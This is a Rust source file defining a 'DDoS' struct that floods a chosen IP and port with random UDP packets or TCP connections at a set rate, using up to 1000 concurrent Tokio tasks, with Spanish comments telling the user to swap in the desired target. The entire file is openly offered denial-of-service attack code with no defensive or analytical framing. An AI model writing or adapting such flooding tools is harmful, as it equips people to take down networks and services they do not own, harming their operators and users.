use std::{
    net::IpAddr,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
    time::Duration,
};
use tokio::{
    net::{TcpStream, UdpSocket},
    runtime::Runtime,
    sync::Semaphore,
    time::sleep,
    io::AsyncWriteExt, 
};

pub struct DDoS {
    stop_flag: Arc<AtomicBool>,
}

impl DDoS {
    pub fn new(requests_per_second: usize) -> Self {
        let stop_flag = Arc::new(AtomicBool::new(false));
        let runtime = Runtime::new().expect("Failed to create Tokio runtime");

        // Parámetros definidos directamente en el código
        let target_ip: IpAddr = "127.0.0.1".parse().expect("Error parsing target IP"); // Cambia esto a la IP deseada
        let target_port = 12345; // Cambia esto al puerto deseado
        let protocol = "udp".to_string(); // Cambia a "tcp" si lo prefieres
        let packet_size = 512; // Cambia esto al tamaño del paquete deseado

        let stop_flag_clone = stop_flag.clone();
        let target_ip_clone = target_ip.clone();
        let target_port_clone = target_port.clone();
        let protocol_clone = protocol.clone();
        let packet_size_clone = packet_size.clone();
        let rate_clone = requests_per_second.clone();

        runtime.spawn(async move {
            Self::run_attack(
                rate_clone,
                stop_flag_clone,
                target_ip_clone,
                target_port_clone,
                protocol_clone,
                packet_size_clone,
            )
            .await;
        });

        Self {
            stop_flag,
        }
    }

    async fn run_attack(
        rate_per_second: usize,
        stop_flag: Arc<AtomicBool>,
        target_ip: IpAddr,
        target_port: u16,
        protocol: String,
        packet_size: usize,
    ) {
        const MAX_CONCURRENT_TASKS: usize = 1000;
        let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_TASKS));
        let delay_micros = match rate_per_second {
            0 => {
                eprintln!("Warning: Rate cannot be zero, using default 1 packet/s");
                1_000_000
            }
            _ => (1_000_000 / rate_per_second) as u64,
        };

        let target_addr: std::net::SocketAddr = (target_ip, target_port).into();

        while !stop_flag.load(Ordering::Relaxed) {
            let semaphore = semaphore.clone();
            let payload_clone = (0..packet_size).map(|_| rand::random::<u8>()).collect::<Vec<u8>>();
            let target_addr_clone = target_addr.clone();
            let protocol_clone = protocol.clone();

            tokio::spawn(async move {
                let _permit = semaphore.acquire_owned().await;
                match protocol_clone.as_str() {
                    "udp" => {
                        if let Ok(socket) = UdpSocket::bind("0.0.0.0:0").await {
                            let _ = socket.send_to(&payload_clone, target_addr_clone).await;
                            // Puedes agregar un println! aquí si quieres ver los envíos
                        } else {
                            eprintln!("Error creating UDP socket");
                        }
                    }
                    "tcp" => {
                        let connect_future = TcpStream::connect(target_addr_clone);
                        match tokio::time::timeout(Duration::from_secs(1), connect_future).await {
                            Ok(Ok(mut stream)) => {
                                if let Err(e) = stream.write_all(&payload_clone).await { // Usamos write_all del trait AsyncWriteExt
                                    eprintln!("Error writing to TCP stream: {}", e);
                                }
                                // No esperamos respuesta en este ejemplo de flooding
                            }
                            Ok(Err(e)) => {
                                eprintln!("Error connecting to TCP target: {}", e);
                            }
                            Err(_timeout) => {
                                eprintln!("Timeout while connecting to TCP target");
                            }
                        }
                    }
                    _ => eprintln!("Unknown protocol: {}", protocol_clone),
                }
                sleep(Duration::from_micros(delay_micros)).await;
            });
        }
    }

    pub fn detener(self) {
        self.stop_flag.store(true, Ordering::Relaxed);
    }
}

